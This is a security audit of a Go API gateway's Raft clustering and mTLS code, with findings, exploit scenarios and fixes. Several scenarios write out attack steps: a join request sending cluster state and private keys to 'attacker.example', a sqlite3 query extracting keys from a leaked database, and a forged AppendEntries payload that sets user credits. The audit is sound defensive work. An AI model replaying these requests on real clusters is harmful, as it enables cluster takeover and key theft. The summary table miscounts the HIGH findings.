# Raft Clustering & mTLS Audit
**Scope:** internal/raft/** + cluster admin endpoints (`/admin/api/v1/cluster/*`, `/admin/api/v1/raft/*`)
**Date:** 2026-04-16
**Scan type:** Targeted manual review (Raft surface only; prior findings in `verified-findings.md` excluded)

---

## Findings

### RAFT-001: mTLS configuration is dead code — `ClusterMTLSConfig` never consumed in production startup
- **Severity:** CRITICAL
- **Confidence:** High
- **CWE:** CWE-311 (Missing Encryption of Sensitive Data), CWE-300 (Channel Accessible by Non-Endpoint / MITM)
- **File:** `internal/cli/run.go:104-167`; `internal/config/types.go:68-80`

**Description**

The documented mTLS bootstrap path — config → `TLSCertificateManager.GenerateCA` / `ImportCACert` → `HTTPTransport.SetTLSConfig` — is **never wired into the production start path**. `NewTLSCertificateManager`, `GenerateCA`, `GenerateNodeCertificate`, and `GetTLSConfig` have no non-test callers anywhere in `cmd/` or `internal/cli/`.

```go
// internal/cli/run.go:110-128 (production cluster init)
if cfg.Cluster.Enabled {
    raftCfg := &raft.Config{ NodeID: ..., BindAddress: ..., ... }
    ...
    transport := raft.NewHTTPTransport(cfg.Cluster.BindAddress, cfg.Cluster.NodeID)
    if cfg.Cluster.RPCSecret != "" {
        if err := transport.SetRPCSecret(cfg.Cluster.RPCSecret); err != nil {
            return fmt.Errorf("RPC secret: %w", err)
        }
    }
    // ← cfg.Cluster.MTLS is never read; transport.SetTLSConfig is never called
    ...
}
```

Cross-check (grep of entire repo for `SetTLSConfig` call sites): only test files reference it; no production code consumes `cfg.Cluster.MTLS` fields (`Enabled`, `AutoGenerate`, `CACertPath`, `NodeCertPath`, `NodeKeyPath`, `AutoCertDir`).

**Exploit scenario**

1. Operator configures `cluster.mtls.enabled: true` per docs (`CLAUDE.md:253`, `apicerberus.example.yaml:310`, `docs/configuration.md:77`), trusting inter-node traffic is encrypted.
2. `run.go` ignores the block; `HTTPTransport` starts plain HTTP on the Raft bind port.
3. Because `SetRPCSecret` also refuses to set the token without TLS (`transport.go:55-58`), setting a non-empty `cluster.rpc_secret` **returns a startup error**, effectively forcing operators to either run Raft unauthenticated and in cleartext, or not start at all. In practice, operators leave `rpc_secret` empty → RPCs are **completely unauthenticated** and in cleartext over the network.
4. Any attacker with L2/L3 reach to the Raft port can send `POST /raft/append-entries` with `Term` set above the current term and inject arbitrary `FSMCommand` log entries (routes, credit balances, certs). See RAFT-003 for the RPC-level consequence.

**Remediation**

1. In `run.go`, after constructing `HTTPTransport` and before `SetRPCSecret`/`NewNode`, if `cfg.Cluster.MTLS.Enabled`:
   - If `AutoGenerate`: call `NewTLSCertificateManager(cfg.Cluster.NodeID, "<cluster-id>")`, `GenerateCA()` (leader only — followers must `ImportCACert` from a trust-root supplied out-of-band, see RAFT-002), `GenerateNodeCertificate()`, then `transport.SetTLSConfig(mgr.GetTLSConfig())`.
   - If manual: load `CACertPath`, `NodeCertPath`, `NodeKeyPath` with strict file-mode checks (reject world-readable), build `tls.Config`, call `SetTLSConfig`.
2. Make `cluster.mtls.enabled: true` the **documented default** when `cluster.enabled: true` and refuse startup otherwise with an explicit "refusing to start insecure Raft cluster" error.
3. Add a startup self-test that confirms the transport has a non-nil `tlsConfig` when `cfg.Cluster.MTLS.Enabled` is true.

---

### RAFT-002: Auto-generate mTLS has no TOFU protection — any node can become its own CA
- **Severity:** HIGH (HIGH if RAFT-001 is fixed; currently moot)
- **Confidence:** High
- **CWE:** CWE-295 (Improper Certificate Validation), CWE-347 (Improper Verification of Cryptographic Signature)
- **File:** `internal/raft/tls.go:25-149`

**Description**

`TLSCertificateManager` exposes `GenerateCA()` + `ImportCACert()`. The documented auto-generate flow is "leader generates CA, shares via Raft log, followers auto-enroll." But:

1. There is no "leader-only" constraint on `GenerateCA`. Any node that calls `GenerateCA()` on boot becomes its own root of trust.
2. `ImportCACert` (`tls.go:136-149`) blindly replaces `m.caCert` with whatever PEM is passed in, with zero pinning, fingerprint check, or signature verification.
3. The trust-bootstrap channel itself is Raft RPCs — which require mTLS — creating a circular dependency. A follower must already trust a CA to verify the AppendEntries from the leader carrying the CA.

```go
// tls.go:136-149
func (m *TLSCertificateManager) ImportCACert(pemData []byte) error {
    block, _ := pem.Decode(pemData)
    if block == nil {
        return fmt.Errorf("failed to decode PEM block")
    }
    cert, err := x509.ParseCertificate(block.Bytes)
    if err != nil {
        return fmt.Errorf("failed to parse certificate: %w", err)
    }
    m.caCert = cert // ← no pinning, no fingerprint verify, no is-CA check
    return nil
}
```

Notably `ImportCACert` does **not** verify `cert.IsCA == true` or `cert.BasicConstraintsValid`, so an attacker could inject a leaf cert and then forge signatures (the verification chain would fail at the leaf, but trust-store semantics are violated).

**Exploit scenario**

In "auto-generate" mode with a fresh follower and a hostile network:
1. Follower boots with no CA trust.
2. Attacker races the legitimate leader and answers with their own self-signed "CA" plus a node cert signed by it.
3. `ImportCACert` accepts it unconditionally. All subsequent Raft RPCs are authenticated against the attacker's CA. The attacker is now a fully trusted member of the cluster and can issue arbitrary FSM commands.

**Remediation**

1. Require a **CA fingerprint pin** (SHA-256 of the CA's SPKI) to be supplied out-of-band at follower bootstrap via config (`cluster.mtls.ca_fingerprint`). `ImportCACert` must verify the fingerprint before assigning.
2. Validate imported certs: `cert.IsCA`, `cert.BasicConstraintsValid`, `KeyUsageCertSign` bit set, `NotBefore <= now < NotAfter`.
3. Do not allow CA rotation without a signed rotation record (current CA signs a message authorising the new one).
4. Document manual-mode as the recommended production mode; "auto-generate" should ship-disabled by default.

---

### RAFT-003: Raft RPC endpoints accept unauthenticated requests when no secret/TLS configured — arbitrary FSM injection
- **Severity:** CRITICAL
- **Confidence:** High
- **CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-345 (Insufficient Verification of Data Authenticity)
- **File:** `internal/raft/transport.go:87-132, 195-219`; `internal/raft/node.go:863-949`

**Description**

Because of RAFT-001, no production deployment has TLS wired, and `SetRPCSecret` refuses to accept a secret without TLS. The `withRPCAuth` middleware only rejects requests when `rpcSecret != ""`:

```go
// transport.go:197-209
func (t *HTTPTransport) withRPCAuth(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        t.mu.RLock()
        secret := t.rpcSecret
        t.mu.RUnlock()
        if secret != "" && !t.authenticateRPC(r, secret) {
            http.Error(w, "unauthorized", http.StatusUnauthorized)
            return
        }
        next(w, r)
    }
}
```

If `rpcSecret == ""` (the only possible state in current production without mTLS), **all** `POST /raft/append-entries`, `/raft/request-vote`, `/raft/install-snapshot` are accepted from anyone who can reach the port.

`HandleAppendEntries` (`node.go:863`) then:
- Treats the caller as the leader if `req.Term >= n.CurrentTerm` (line 877–883: `n.leaderID = req.LeaderID`).
- Accepts and appends `req.Entries` into the log (line 917–930).
- Advances CommitIndex and applies to the FSM (line 937–945).

**Exploit scenario**

1. Attacker sends `POST /raft/append-entries` with `Term=999999`, `LeaderID="attacker"`, `PrevLogIndex=0`, `Entries=[{ Index:1, Term:999999, Command: <bytes for FSMCommand{Type:"update_credits", Payload:{"user_id":"X","amount":1000000000,"set":true}}> }]`, `LeaderCommit=1`.
2. Follower accepts — its term jumps, it switches to follower of the attacker, appends the entry, commits it, applies it.
3. The attacker has mutated cluster-wide state (credits, routes, certificates, rate limits). The entry is replicated to the real leader on next election round because the attacker's term is higher.

**Remediation**

This is a direct consequence of RAFT-001/RAFT-002. Fix those, and additionally:
- Validate `req.LeaderID` against the known peer set before accepting AppendEntries (defence in depth — even under mTLS, a rogue member with a signed cert must not be able to replay someone else's `LeaderID`).
- Require TLS client cert CN to match `req.LeaderID` (derive leader identity from the TLS session, not the JSON payload).

---

### RAFT-004: Cluster join endpoint has no peer verification — anyone with admin key can make any address a peer
- **Severity:** HIGH
- **Confidence:** High
- **CWE:** CWE-918 (SSRF), CWE-346 (Origin Validation Error), CWE-807 (Reliance on Untrusted Inputs)
- **File:** `internal/raft/cluster.go:181-232`

**Description**

```go
// cluster.go:186-214
var req JoinRequest
if err := json.NewDecoder(r.Body).Decode(&req); err != nil { ... }
if !cm.node.IsLeader() { ... }
cm.node.AddPeer(req.NodeID, req.Address) // ← no validation of NodeID or Address
```

Issues:
1. `req.NodeID` and `req.Address` are trusted verbatim. No format check (hostport shape, allowed schemes, loopback/metadata-IP block).
2. No verification the new node is actually reachable, owns the claimed ID, or presents a valid cluster cert. The leader blindly begins sending it AppendEntries — which will carry the **full Raft log including FSM commands** (credits, cert PEMs via `certificate_update`, routes).
3. Because `ClusterManager.handleJoin` adds to `cm.node.Peers` but **never** calls `transport.SetPeer(req.NodeID, req.Address)`, the leader will then call `transport.postRPC(peerID, ...)` which looks up `t.peers[nodeID]` (transport.go:228) and finds nothing → `unknown peer` error on every replication attempt. This is a separate bug (join is broken) but also means in the current implementation the exposure is limited to state leak via leader status endpoints; the moment the transport sync is fixed, full FSM state (including `KeyPEM` in `CmdCertificateUpdate` — see RAFT-007) is exfiltrated to the attacker-controlled address.
4. No rate limiting / replay protection — repeated join requests with random `NodeID`s grow `n.Peers` without bound and will eventually skew `replicaCount` / `totalNodes` quorum math (`node.go:571-586`), making commits impossible (perpetual under-quorum).

**Exploit scenario**

Attacker with a stolen admin key (or reaching the admin port from a compromised workstation — the admin port is shared with cluster admin, see RAFT-006):
```
POST /admin/api/v1/cluster/join
Authorization: Bearer <stolen-key>
{"node_id":"evil","address":"attacker.example:12000"}
```
On the next replication cycle (once transport is correctly updated), the leader streams:
- All FSM routes/services/upstreams
- All credit balances (enumeration of every user ID + balance)
- All ACME-issued certs **including private keys** (`KeyPEM` in `CertificateState`) — since `applyCertificateUpdate` stores keys and followers receive them via AppendEntries of `CmdCertificateUpdate` payloads

**Remediation**

1. Validate `req.Address`: must be `host:port`, must not resolve to loopback/link-local/cloud-metadata IPs (reuse `validateUpstreamHost()` from federation).
2. Require the joining node to present a valid client cert signed by the cluster CA (mTLS), *before* admin-key check.
3. Cap the number of peers; reject if `len(Peers) >= cluster.max_peers`.
4. Rate-limit `/cluster/join` to a few requests per minute per IP (even with a valid admin key).
5. After `AddPeer`, also `transport.SetPeer(req.NodeID, req.Address)` (functional fix) *and* verify reachability with a challenge-response.

---

### RAFT-005: FSM Apply type-assertion panics on replicated entries (follower DoS and leader re-election storm)
- **Severity:** HIGH
- **Confidence:** High
- **CWE:** CWE-20 (Improper Input Validation), CWE-754 (Improper Check for Unusual Conditions), CWE-248 (Uncaught Exception)
- **File:** `internal/raft/fsm.go:156-164`; `internal/raft/node.go:591-609`

**Description**

```go
// fsm.go:156-164
func (f *GatewayFSM) Apply(entry LogEntry) any {
    f.mu.Lock()
    defer f.mu.Unlock()

    var cmd FSMCommand
    if err := json.Unmarshal(entry.Command.([]byte), &cmd); err != nil {
        return fmt.Errorf("failed to unmarshal command: %w", err)
    }
    ...
}
```

`entry.Command` is typed `any`. On the leader, it's set from `json.Marshal(command)` (node.go:779–788), so it is a `[]byte`. But on a **follower**, the entry arrives via JSON-decoded `AppendEntriesRequest.Entries` — JSON unmarshaling of `any` from a `[]byte` field (which JSON serializes as a base64 string) yields a Go `string`, not `[]byte`.

`entry.Command.([]byte)` on a `string` → **runtime panic**: `interface conversion: interface {} is string, not []uint8`.

Each panic kills the calling goroutine. `applyCommitted` is invoked from within `HandleAppendEntries` while holding `n.mu.Lock()`. On panic:
- The mutex is not released (no `recover()` anywhere in node.go/fsm.go).
- All subsequent AppendEntries/RequestVote/reads on that node deadlock.
- The follower stops sending heartbeats and responses, triggering a cluster-wide election storm.

Same panic path also fires when loading from `SQLiteStorage.LoadLog` **iff** the entry was written with a non-`[]byte` Command — storage stores JSON-marshaled Command as a BLOB (`storage.go:87-92`), so replay after restart survives, but the first follower receiving a live replication hits the panic.

This likely hasn't been caught in tests because `TestRaftClustering` / integration tests use `InmemTransport` (`transport.go:359`+), which passes the `*LogEntry` by reference **without a JSON round-trip**, preserving the `[]byte` type.

**Exploit scenario**

1. Any condition that causes a follower to apply a replicated (JSON-transported) entry triggers the panic.
2. Attacker who can reach the Raft port (RAFT-003) crashes every follower in sequence by sending AppendEntries with a valid-looking entry.
3. Or: normal operation — the first time a leader replicates a non-trivial log entry to an HTTP-transport follower, follower crashes.

**Remediation**

Accept both `[]byte` and `string` in Apply:

```go
var raw []byte
switch v := entry.Command.(type) {
case []byte:
    raw = v
case string:
    raw = []byte(v)
case nil:
    return nil
default:
    return fmt.Errorf("unexpected command type %T", v)
}
if err := json.Unmarshal(raw, &cmd); err != nil { ... }
```

Better: change `LogEntry.Command` from `any` to `json.RawMessage` and enforce serialization end-to-end. Add `defer func() { if r := recover(); r != nil { ... } }()` at the top of `Apply` and `applyCommitted` to prevent mutex-held panics from taking the whole node down.

---

### RAFT-006: ClusterManager binds its own HTTP server to the same address as the Admin API — startup race / port collision
- **Severity:** MEDIUM (correctness + availability); **HIGH if admin-key is reused for cluster and the collision silently succeeds with only one server reachable**
- **Confidence:** High
- **CWE:** CWE-694 (Use of Multiple Resources with Duplicate Identifier), CWE-404 (Improper Resource Shutdown)
- **File:** `internal/cli/run.go:95-96, 161`; `internal/raft/cluster.go:47-79`

**Description**

```go
// run.go:95-96
adminHTTP := &http.Server{ Addr: cfg.Admin.Addr, Handler: adminSrv, ... }
// run.go:161
clusterMgr = raft.NewClusterManager(raftNode, gatewayFSM, cfg.Admin.Addr, cfg.Admin.APIKey)
// cluster.go:61-78 — clusterMgr starts ITS OWN http.Server on the same cfg.Admin.Addr
cm.server = &http.Server{ Addr: cm.apiAddr, Handler: cm.authMiddleware(mux), ... }
go func() { cm.server.ListenAndServe() /* ← error intentionally swallowed */ }()
```

Two `http.Server` instances are started with the same `Addr`. On every OS (Linux/Windows/macOS, no `SO_REUSEPORT`), the second `ListenAndServe` returns `bind: address already in use`. That error is **deliberately swallowed** in cluster.go:73-75 (`_ = err // error during serve; intentionally not logged`). The admin HTTP server (started later in `run.go:237`) wins or loses depending on scheduler timing.

Net effect in current code:
- Admin API handlers (`internal/admin/server.go`) for routes/users/billing are served on :9876 as intended; the cluster endpoints `/admin/api/v1/cluster/*` and `/admin/api/v1/raft/*` registered in `cluster.go:51-59` are **never reachable in production**. They belong to the failed-to-bind second server.
- The health-check in `monitorClusterHealth` (`cluster.go:372`) probes `http://<addr>/admin/api/v1/cluster/status` on peers, which ends up hitting the **admin server** on peers (which doesn't register cluster endpoints — see earlier grep) and always returns 404 → all peers marked unhealthy after 3 probes.
- Swallowed-error (`cluster.go:74`) makes this silent; operators have no signal.

Also: `cm.authMiddleware` (`cluster.go:89-99`) expects `Authorization: Bearer <key>` but the admin API uses `X-Admin-Key` header. Different auth schemes for the same URL prefix would cause lockout if the servers ever coexisted.

**Exploit scenario**

Availability: operators configuring clusters observe "peers unhealthy, cluster never stable"; cannot use `POST /admin/api/v1/cluster/join` at all in a clean deployment.

Confidentiality: if a future refactor resolves the port collision (e.g., moving cluster endpoints under the admin server), the mismatched `Bearer` scheme plus the existing admin-key leak vectors combine to give cluster-control access with just the admin key.

**Remediation**

1. Give the cluster manager its own config field (`cluster.admin_addr`, default `:9878`) instead of reusing `cfg.Admin.Addr`.
2. Or, preferably, **delete** `ClusterManager.Start`'s HTTP server entirely; register `/admin/api/v1/cluster/*` handlers on the existing admin `http.ServeMux` so they share auth/middleware/metrics with the rest of the admin API.
3. Do not swallow `ListenAndServe` errors — log and return to the error channel in `runStart`.
4. Unify on `X-Admin-Key` header so `curl` examples in `CLAUDE.md:240-242` and `docs/TROUBLESHOOTING.md:150` actually work.

---

### RAFT-007: Private TLS keys (`KeyPEM`) are replicated in plaintext via Raft log and stored in SQLite BLOB — at-rest and in-flight exposure
- **Severity:** HIGH
- **Confidence:** High
- **CWE:** CWE-312 (Cleartext Storage of Sensitive Information), CWE-319 (Cleartext Transmission)
- **File:** `internal/raft/certificate_sync.go:16-23, 79-112`; `internal/raft/fsm.go:367-382`; `internal/raft/storage.go:74-98`

**Description**

`ProposeCertificateUpdate` marshals a `CertificateUpdateLog` containing the full private key PEM:

```go
// certificate_sync.go:16-23
type CertificateUpdateLog struct {
    Domain    string    `json:"domain"`
    CertPEM   string    `json:"cert_pem"`
    KeyPEM    string    `json:"key_pem"`          // ← private key, unencrypted
    IssuedAt  time.Time `json:"issued_at"`
    ExpiresAt time.Time `json:"expires_at"`
    IssuedBy  string    `json:"issued_by"`
}
```

This payload is:
1. Transmitted to every follower via `POST /raft/append-entries` — **in cleartext** given RAFT-001 (mTLS not wired).
2. Persisted in `raft_log` SQLite table as a BLOB (`storage.go:81-92`) — default SQLite file permissions are `0644` (world-readable on most systems unless specifically hardened). The repo's store layer does not `chmod 0600` the DB file.
3. Materialized into `GatewayFSM.Certificates[domain].KeyPEM` and kept in-memory on every node.

The code author was aware of the risk — the snapshot path explicitly strips `KeyPEM` (`fsm.go:118-126, 198-223`). But the **log itself** (which is what persists and replicates) still contains it. Log compaction via `compactLog` (`node.go:624`) eventually replaces with snapshot, but between issuance and compaction every node has the private key on disk in plain JSON inside the BLOB.

**Exploit scenario**

1. Any attacker with read access to `apicerberus.db` (backup leak, left-over volume, shared worker disk, `make backup` without encrypted destination) can `sqlite3 apicerberus.db "SELECT command FROM raft_log"` and extract every issued private key.
2. A network attacker (see RAFT-001) observes AppendEntries with `CmdCertificateUpdate` and captures keys from the wire.

**Remediation**

1. Never replicate unencrypted private keys. Instead:
   - Encrypt `KeyPEM` with a cluster-wide KEK (itself derived from the mTLS CA key or from a Vault/KMS-held master key) before putting it in a `CertificateUpdateLog`.
   - Or do not replicate keys at all: each node generates its own key and requests a CSR-signed cert from the leader; the leader signs but never sees/distributes private material.
2. Set `0600` on `apicerberus.db` and any SQLite sidecar files (`-wal`, `-shm`) at creation. Verify on every start; refuse to start if too permissive.
3. Exclude raw log BLOBs from `make backup` unless the destination is encrypted.
4. Update `applyCertificateUpdate` to zero-out the unmarshaled payload buffer after copying into the FSM (defence in depth against memory dumps).

---

### RAFT-008: `CmdUpdateCredits` in FSM has no bounds / authenticity check — any replicated entry can zero or inflate balances
- **Severity:** HIGH (financial integrity)
- **Confidence:** High
- **CWE:** CWE-20 (Improper Input Validation), CWE-840 (Business Logic Errors)
- **File:** `internal/raft/fsm.go:329-344`

**Description**

```go
// fsm.go:329-344
func (f *GatewayFSM) applyUpdateCredits(payload json.RawMessage) error {
    var update struct {
        UserID string `json:"user_id"`
        Amount int64  `json:"amount"`
        Set    bool   `json:"set"`
    }
    if err := json.Unmarshal(payload, &update); err != nil { return err }
    if update.Set {
        f.CreditBalances[update.UserID] = update.Amount
    } else {
        f.CreditBalances[update.UserID] += update.Amount
    }
    return nil
}
```

Issues:
- No range check on `Amount` — can be `math.MinInt64` / `math.MaxInt64`, can go negative.
- No `UserID` format validation or existence check — cluster FSM doesn't know what's a valid user.
- `Set: true` with negative Amount silently zeros / goes negative.
- Increment path overflows silently (`int64` addition wraps).
- No idempotency key — a replayed log entry re-applies the delta.

Same class of issue in `applyUpdateRateLimit` (`fsm.go:312-327`) and `applyIncrementCounter` (`fsm.go:355-365`) — arbitrary int64 deltas accepted.

**Exploit scenario**

Given RAFT-003 (anyone can push log entries), an attacker sends one `CmdUpdateCredits{UserID:"target", Amount:math.MaxInt64, Set:true}` and the target's balance is effectively infinite across the cluster; test-key bypass already skips credits, but `ck_live_*` users can now call priced routes for free indefinitely. Alternatively, `Amount:0, Set:true` for a user denies service.

Even **with** mTLS, a compromised node inside the cluster (one of many in multi-region deployments) can unilaterally issue these commands — FSM does zero authority check on the issuer.

**Remediation**

1. Reject `Amount < 0` on `Set: true`. Reject increments that would overflow (`math.MaxInt64 - current < amount`).
2. Validate `UserID` matches `^[a-zA-Z0-9_-]{1,64}$` (or UUID format).
3. Include an `IssuedBy` (node ID) and `Nonce` in the payload, validate `IssuedBy` equals `LeaderID` of the entry's term, reject duplicate nonces.
4. Funnel all credit mutations through the billing repository's existing atomic-transaction path; the Raft layer replicates the *intent*, the node re-validates against the DB before materialising.

---

### RAFT-009: Cluster API uses weak `http.Header.Get` parsing of Authorization — no `Bearer` format enforcement, accepts any exact-match string
- **Severity:** LOW
- **Confidence:** High
- **CWE:** CWE-287 (Improper Authentication)
- **File:** `internal/raft/cluster.go:89-99`

**Description**

```go
apiKey := r.Header.Get("Authorization")
expected := "Bearer " + cm.apiKey
if subtle.ConstantTimeCompare([]byte(apiKey), []byte(expected)) != 1 { ... }
```

- Case-sensitive — `bearer <key>` is rejected. Most OAuth libraries accept case-insensitive scheme.
- No trimming — a trailing space sent by any client breaks auth silently.
- Constant-time comparison of two strings of *different lengths* leaks length via early return in `subtle.ConstantTimeCompare` (it returns 0 immediately on length mismatch without constant-time work).
- No rate limiting — this endpoint is vulnerable to the same brute-force pattern `withAdminStaticAuth` already defends against in `token.go` (Finding 6 in the prior audit). The cluster endpoints do not reuse that middleware.

**Remediation**

1. Reuse `internal/admin/token.go:withAdminStaticAuth` middleware (includes rate limiting, failed-auth tracking, constant-time compare over padded buffers).
2. Move cluster endpoints under the admin server (see RAFT-006) — eliminates the duplicate auth code.

---

### RAFT-010: Certificate common-name/SAN only contains `nodeID` and `localhost` — IP-based peer connections will fail hostname verification, degrades security on fix
- **Severity:** LOW (design)
- **Confidence:** High
- **CWE:** CWE-295 (Improper Certificate Validation)
- **File:** `internal/raft/tls.go:79-90`

**Description**

```go
// tls.go:79-90
template := &x509.Certificate{
    SerialNumber: big.NewInt(2),         // ← CONSTANT across all node certs
    Subject:      pkix.Name{CommonName: m.nodeID},
    NotBefore:    time.Now(),
    NotAfter:     time.Now().Add(365 * 24 * time.Hour),
    KeyUsage:     ...,
    ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
    DNSNames:     []string{m.nodeID, "localhost"},
}
```

Issues:
1. **`SerialNumber: big.NewInt(2)` is hard-coded** — every node cert has serial `2`, and the CA cert has serial `1` (`tls.go:40`). Duplicate serials break CRL/OCSP, and violate RFC 5280 §4.1.2.2 ("Certificate serial numbers must be unique within a CA"). Use `crypto/rand` 128-bit serials.
2. No `IPAddresses` SAN. When `cfg.Cluster.Peers[].Address = "10.0.1.5:12000"`, the Go TLS stack does hostname verification against `10.0.1.5` and finds no matching SAN → handshake fails unless `InsecureSkipVerify` (which the code does not set, good). So production IP-only deployments are broken when mTLS is finally wired up.
3. Hard-coded `"localhost"` in DNSNames means any node can impersonate `localhost` connections (low impact but unnecessary).
4. 1-year validity with **no renewal path**: `GenerateNodeCertificate` is only ever called at startup. On day 366, all node certs expire simultaneously and the entire cluster becomes unreachable. No rotation / renewal scheduler exists for Raft certs (`certmanager/` handles Let's-Encrypt for public traffic only). This is a latent split-brain + total-outage risk.

**Remediation**

1. Use `rand.Int(rand.Reader, serialNumberLimit)` with `serialNumberLimit = 1 << 128` for both CA and node certs.
2. Populate `IPAddresses` with parsed IPs from `cfg.Cluster.Peers[].Address`; populate `DNSNames` only for hostnames.
3. Add a background renewal goroutine that regenerates node certs when `NotAfter - now < 30d` and rotates via `transport.SetTLSConfig` hot-swap.
4. Remove `"localhost"` unless explicitly requested by config.

---

### RAFT-011: In-memory Raft RPC request body size cap (10MB) is enforced, but InstallSnapshot has no incremental streaming — single large snapshot can OOM followers
- **Severity:** LOW-MEDIUM
- **Confidence:** Medium
- **CWE:** CWE-770 (Allocation of Resources Without Limits)
- **File:** `internal/raft/transport.go:85, 96-98`; `internal/raft/node.go:951-1017`

**Description**

`maxRaftRPCBodySize = 10 << 20` (10MB) is applied via `http.MaxBytesHandler`. That bounds the *per-request* body. But `InstallSnapshot` holds the entire snapshot `[]byte` in memory (`node.go:454`, `node.go:976`) — both in the request buffer and in the FSM `Restore` call. For large FSMs (e.g., 100k credit balances + many cert PEMs) the snapshot comes in one JSON blob and allocation is 2x–3x of its size during decode.

Combined with the 10MB cap: if legitimate state exceeds 10MB, follower catch-up via snapshot silently fails with HTTP 413 and the follower never catches up. There is no automatic fallback to entry-by-entry AppendEntries for a lagging follower in this path.

**Remediation**

1. Chunk InstallSnapshot with `Offset` + `Done` fields (standard Raft pattern). The request struct already has a `Done bool` (`rpc.go:43`) but sending is non-chunked in `node.go:449-456`.
2. Make the cap configurable based on expected FSM size.

---

### RAFT-012: `multiregion.go` cross-region latency probe via raw TCP dial leaks node presence; no replay/auth on region replication status
- **Severity:** LOW
- **Confidence:** Medium
- **CWE:** CWE-200 (Information Exposure)
- **File:** `internal/raft/multiregion.go:461-474, 311-341`

**Description**

```go
// multiregion.go:461-474
func (m *MultiRegionManager) measureLatencyToNode(nodeID, address string) {
    start := time.Now()
    conn, err := net.DialTimeout("tcp", address, 2*time.Second)
    ...
}
```

Issues:
- Every 10s (`ticker`), every node TCP-connects to every other node's Raft port. No auth/TLS on the dial — just measures connect time and disconnects. This works but:
  - On scanning/IDS, these look like port probes and may be flagged.
  - Measures only TCP handshake time, not actual Raft-layer RTT, so it's misleading.
  - If `address` is misconfigured (config drift, RAFT-004) a node will dial arbitrary endpoints every 10s — useful for an attacker to cause the gateway to "ping" internal-IP targets (low-grade SSRF probe source).
- `UpdateReplicationStatus` (line 311-341) is called from replication code with no identity check — any peer can report arbitrary `matchIndex` values that poison the `regionReplicationStatus` map. Used downstream by `ShouldReplicateToRegion` to skip real replication.

**Remediation**

1. Measure latency from actual Raft AppendEntries RTT (already available at the transport layer) instead of spawning TCP dials.
2. Authenticate the caller of `UpdateReplicationStatus` (TLS cert CN must match the region being updated).
3. Rate-limit status updates per peer.

---

### RAFT-013: Minor: constant-time compare early-exit on length in `authenticateRPC`
- **Severity:** Informational
- **Confidence:** High
- **CWE:** CWE-208 (Observable Timing Discrepancy) — informational
- **File:** `internal/raft/transport.go:211-219, 223-225`

`subtle.ConstantTimeCompare` returns 0 immediately if `len(a) != len(b)`, which is correct for constant-time equality of byte slices but leaks the length of the expected secret via timing if the attacker can submit tokens of varying length. The fix (not needed unless paranoid) is to always compare a fixed-length hash of both inputs (`sha256.Sum256`), which the existing `cryptoSubtleConstantTimeCompare` wrapper (tranport.go:223-225) could be updated to do without changing callers.

---

## Positive Findings

- **P-RAFT-1:** `TLSCertificateManager.GetTLSConfig` pins `MinVersion: tls.VersionTLS13` and `ClientAuth: tls.RequireAndVerifyClientCert` (`tls.go:117-120`). Correct and strong mTLS posture — provided RAFT-001/002 are fixed so the config actually reaches the transport.
- **P-RAFT-2:** `rsa.GenerateKey(rand.Reader, 4096)` uses 4096-bit keys for both CA and node certs (`tls.go:34, 74`). Exceeds 2048 minimum.
- **P-RAFT-3:** `crypto/rand` (not `math/rand`) is used for all key material and in `tls.go`. Good.
- **P-RAFT-4:** `RaftRPCBodySize` 10MB cap via `http.MaxBytesHandler` on all three Raft RPC endpoints (`transport.go:96-98`) prevents trivial DoS via unbounded body allocation.
- **P-RAFT-5:** `SetRPCSecret` refuses to accept a secret when TLS is not enabled (`transport.go:55-58`) — prevents accidental token leak over cleartext. Good defence in depth.
- **P-RAFT-6:** `postRPC` only sends the `X-Raft-Token` header when `useTLS && secret != ""` (`transport.go:252-254`) — defence against operator mistake.
- **P-RAFT-7:** `authenticateRPC` uses `crypto/subtle.ConstantTimeCompare` (`transport.go:212-219`) — correct defense against timing oracle.
- **P-RAFT-8:** FSM snapshot path deliberately strips `KeyPEM` (`fsm.go:118-126, 198-223`) — author was aware of at-rest secret risk; unfortunately the log itself still contains keys (RAFT-007).
- **P-RAFT-9:** `applyCommitted` / `lastLogIndex` underflow guards (`node.go:594-607`, `node.go:556-560`) show care about uint64 wraparound around snapshots.
- **P-RAFT-10:** `GatewayFSM.Apply` holds an exclusive write lock; read paths (`GetRoute`, etc.) use RLock — thread-safety is correct at the mutex level (pending the panic issue in RAFT-005).
- **P-RAFT-11:** `storage.SaveLog` uses a transaction with `INSERT OR REPLACE` (`storage.go:74-98`) — idempotent persistence.

---

## Summary

| Severity | Count | IDs |
|----------|-------|-----|
| CRITICAL | 2 | RAFT-001, RAFT-003 |
| HIGH     | 4 | RAFT-002, RAFT-004, RAFT-005, RAFT-007, RAFT-008 |
| MEDIUM   | 1 | RAFT-006 |
| LOW      | 4 | RAFT-009, RAFT-010, RAFT-011, RAFT-012 |
| INFO     | 1 | RAFT-013 |

**Top 3 priorities (ship before any multi-node deployment):**
1. **RAFT-001 + RAFT-003 + RAFT-007** — wire mTLS config end-to-end, or explicitly gate `cluster.enabled: true` behind `cluster.mtls.enabled: true` at config-validation time. Without this, any network reach to port 12000 = full cluster compromise + private-key exfiltration.
2. **RAFT-005** — fix the FSM `Apply` type-assertion; current HTTP-transport deployments crash on first replicated entry.
3. **RAFT-006** — stop binding `ClusterManager`'s HTTP server on top of the admin server; either remove the duplicate server or give it its own port.
